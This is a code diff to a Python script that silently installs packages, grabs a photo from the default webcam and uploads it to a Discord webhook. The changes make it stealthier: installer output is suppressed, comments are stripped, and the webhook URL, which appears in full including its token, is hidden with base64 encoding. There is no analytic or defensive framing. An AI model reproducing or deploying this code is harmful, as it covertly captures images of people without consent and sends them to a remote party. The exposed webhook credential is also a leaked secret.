@@ -2,43 +2,42 @@ import os
 import subprocess
 import sys
 import io
+import base64
+import cv2
+import requests
+import numpy as np
 
 # Function to install a package if it's not already installed
 def install(package):
-    subprocess.check_call([sys.executable, "-m", "pip", "install", package])
+    subprocess.check_call([sys.executable, "-m", "pip", "install", package], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
-# Automatically install dependencies if they are not already installed
-try:
-    import cv2
-except ImportError:
-    print("opencv-python not found, installing...")
-    install("opencv-python")
+# Ensure required packages are installed
+required_packages = ["opencv-python", "requests", "numpy"]
 
-try:
-    import requests
-except ImportError:
-    print("requests not found, installing...")
-    install("requests")
+for package in required_packages:
+    try:
+        __import__(package.replace("-", "_"))  # Convert "opencv-python" to "opencv_python"
+    except ImportError:
+        print(f"Installing {package}...")
+        install(package)
 
-# Now we can proceed with the rest of the code
-import cv2
-import time
-import numpy as np  # Import numpy for the sharpening filter
+# Function to decrypt the webhook (Base64 decoding)
+def decrypt_webhook():
+    encoded_webhook = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMyMDkyMjYxNTYwMjIyMTA5Ny9scFhiTmcyMmRBZ21UNFZ2R0FGbmZTOFRURHJQS0tlc3hLZjR6SkVfdlNtVVhObGpXTmh4TUcxZEFqeVZ5Vks2d1FsNQ=="
+    decoded_bytes = base64.b64decode(encoded_webhook)
+    return decoded_bytes.decode("utf-8")
 
 # Function to capture a photo and send it to the Discord webhook
 def capture_and_send_to_webhook():
-    # Open the default camera (index 0)
     cap = cv2.VideoCapture(0)
 
     if not cap.isOpened():
         print("Failed to open the camera.")
         return
 
-    # Set a lower resolution for faster capture (640x480)
-    cap.set(cv2.CAP_PROP_FRAME_WIDTH, 640)  # 640px width
-    cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)  # 480px height
+    cap.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
+    cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)
 
-    # Capture image
     ret, frame = cap.read()
     cap.release()
 
@@ -46,16 +45,14 @@ def capture_and_send_to_webhook():
         print("Failed to capture image.")
         return
 
-    # Convert the image to a format suitable for in-memory sending (JPEG)
     _, img_encoded = cv2.imencode('.png', frame)
-    img_bytes = img_encoded.tobytes()  # Convert to bytes
+    img_bytes = img_encoded.tobytes()
 
-    # Send the image to the Discord webhook (in-memory)
     send_image_to_webhook(img_bytes)
 
 # Function to send the image to the webhook
 def send_image_to_webhook(image_bytes):
-    webhook_url = 'https://discord.com/api/webhooks/1320922615602221097/lpXbNg22dAgmT4VvGAFnfS8TTDrPKKesxKf4zJE_vSmUXNljWNhxMG1dAjyVyVK6wQl5'
+    webhook_url = decrypt_webhook()
 
     files = {
         'file': ('webcam.png', io.BytesIO(image_bytes), 'image/png')
@@ -64,7 +61,6 @@ def send_image_to_webhook(image_bytes):
         'content': 'Here is the webcam photo!'
     }
 
-    # Send the image to the webhook
     response = requests.post(webhook_url, data=data, files=files)
     
     if response.status_code == 204:
